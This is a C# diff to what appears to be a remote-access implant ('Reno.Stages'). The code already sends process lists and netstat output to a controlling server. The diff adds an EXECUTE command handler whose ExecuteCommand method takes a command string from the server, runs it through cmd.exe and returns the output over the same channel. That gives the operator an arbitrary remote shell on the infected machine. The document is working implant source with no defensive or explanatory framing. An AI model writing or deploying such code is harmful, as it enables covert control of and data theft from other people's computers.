@@ -107,6 +107,9 @@ namespace Reno.Stages
                         case CommChannel.PS:
                             SendProcessList(header);
                             break;
+                        case CommChannel.EXECUTE:
+                            ExecuteCommand(header);
+                            break;
                     }
                 }
                 catch(IOException ioe)
@@ -417,6 +420,10 @@ namespace Reno.Stages
                 channel.SendBytes(bytes);
             }
         }
+        /// <summary>
+        /// Helper function to sent tasklist output to the server
+        /// </summary>
+        /// <param name="header">CommHeader that was sent from the server</param>
         private void SendProcessList(CommHeader header)
         {
             Process ps = new Process();
@@ -452,6 +459,32 @@ namespace Reno.Stages
             CommHeader netstatHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, netstatBytes.Length);
             channel.SendHeader(netstatHeader);
             channel.SendBytes(netstatBytes);
+        }
+        /// <summary>
+        /// Helper function to execute shell commands
+        /// </summary>
+        /// <param name="header">The CommHeader that was sent from the server</param>
+        private void ExecuteCommand(CommHeader header)
+        {
+            Process command = new Process();
+            ProcessStartInfo commandInfo = new ProcessStartInfo();
+            string commandString = "/C ";
+            // Read the command string
+            byte[] bytes = channel.Decompress(channel.ReceiveBytes(header.DataLength));
+            string commandArgs = Encoding.UTF8.GetString(bytes);
+            commandString += commandArgs;
+            Console.WriteLine("[*] Command string: {0}", commandString);
+            commandInfo.FileName = "cmd.exe";
+            commandInfo.Arguments = commandString;
+            commandInfo.UseShellExecute = false;
+            commandInfo.RedirectStandardOutput = true;
+            command.StartInfo = commandInfo;
+            command.Start();
+            string commandOutput = command.StandardOutput.ReadToEnd();
+            byte[] commandBytes = Encoding.UTF8.GetBytes(commandOutput);
+            CommHeader commandHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, commandBytes.Length);
+            channel.SendHeader(commandHeader);
+            channel.SendBytes(commandBytes);
         }
         /// <summary>
         /// Helper function to print out the directory listing
